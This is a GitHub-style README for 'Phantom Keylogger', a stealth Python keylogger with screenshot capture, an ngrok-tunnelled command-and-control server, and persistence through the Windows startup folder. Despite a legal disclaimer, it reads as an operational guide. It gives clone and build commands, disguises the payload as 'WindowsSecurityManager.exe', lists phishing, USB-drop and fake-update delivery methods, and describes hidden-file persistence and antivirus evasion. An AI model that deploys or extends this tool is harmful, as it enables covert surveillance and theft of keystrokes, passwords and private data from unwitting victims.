# Phantom Keylogger 

![Red Team](https://img.shields.io/badge/OPERATION-PHANTOM-red)
![Stealth](https://img.shields.io/badge/STEALTH-ACTIVE-black)
![Version](https://img.shields.io/badge/VERSION-1.0.0-critical)

## 🎯 MISSION BRIEF

**Phantom Keylogger** is an advanced, stealth-enabled keystroke and visual intelligence gathering system. Built with operational security as the primary objective, this tool provides persistent surveillance capabilities while maintaining minimal footprint on target systems.

### ⚠️ LEGAL WARNING & USAGE POLICY

THIS TOOL IS STRICTLY FOR:  
    - Authorized penetration testing  
    - Red team exercises with written permission  
    - Educational security research  
    - Corporate security assessments with proper authorization  

STRICTLY PROHIBITED FOR:  
    - Unauthorized surveillance  
    - Illegal hacking activities    
    - Personal data theft  
    - Any malicious purposes  

**USERS ASSUME FULL LEGAL RESPONSIBILITY FOR PROPER USAGE**


## 🛡️ OPERATIONAL CAPABILITIES

### Core Intelligence Gathering
- **Keystroke Logging**: Advanced keyboard capture with special key translation
- **Visual Surveillance**: Automated screenshot capture at configurable intervals
- **System Intelligence**: Hostname, username, and environment data collection
- **Persistent Operations**: Continuous monitoring with automatic recovery

### Stealth & Evasion Features
- **Zero UI Footprint**: Completely invisible to end users
- **Persistence Mechanisms**: Automatic startup installation
- **Anti-Analysis**: Mutex-based single instance protection
- **File System Stealth**: Hidden file attributes and obfuscated naming
- **Network Camouflage**: Secure communication through ngrok tunnels

## 🚀 QUICK DEPLOYMENT

### Phase 1: Command & Control Setup

```bash
# 1. Clone operational repository
git clone https://github.com/MattiaAlessi/phantom-keylogger
cd phantom-keylogger

# 2. Install operational dependencies
pip install -r requirements.txt

# 3. Deploy C2 server
python server.py
```

### Phase 2: Payload Generation

```bash
# Generate stealth executable
python build.py
```

**Output**: dist/WindowsSecurityManager.exe

### Phase 3: Target Deployment

Delivery Methods:
- **Phishing Campaigns**: Document macros or fake installers
- **Physical Access**: USB drop attacks
- **Lateral Movement**: Compromised internal shares
- **Social Engineering**: Fake software updates


### Phase 4: Visual tool
```bash
# Start the GUI interface 
python manager.py
```


## 🔧 TECHNICAL SPECIFICATIONS

### Architecture Overview

```text
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│   TARGET        │    │   C2 TUNNEL      │    │   OPERATOR      │
│                 │    │                  │    │                 │
│  ┌─────────────┐│    │  ┌─────────────┐ │    │  ┌─────────────┐│
│  │ Stealth     ││    │  │ Ngrok       │ │    │  │ Management  ││
│  │ Keylogger   ├───────►│ Tunnel      ├───────►│ Console      ││
│  │             ││    │  │             │ │    │  │             ││
│  └─────────────┘│    │  └─────────────┘ │    │  └─────────────┘│
└─────────────────┘    └──────────────────┘    └─────────────────┘
```

### Persistence Mechanisms

Startup Folder: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\  
File Name: WindowsSecurityManager.exe  
Attributes: Hidden system file  
Mutex: Global\WindowsSecurityUpdateManager  


## 🛡️ DEFENSE EVASION TECHNIQUES

### AV/EDR Bypass Methods  
- Legitimate Naming: Uses Windows security-related names
- Behavioral Obfuscation: Normal system process patterns
- Network Blending: HTTPS traffic to legitimate-looking domains
- Memory Operations: No suspicious API calls or injection

### Detection Countermeasures
- No Disk Writes: All data transmitted remotely
- Standard Libraries: Only common Python libraries used
- Clean Exit Procedures: No crash dumps or error reports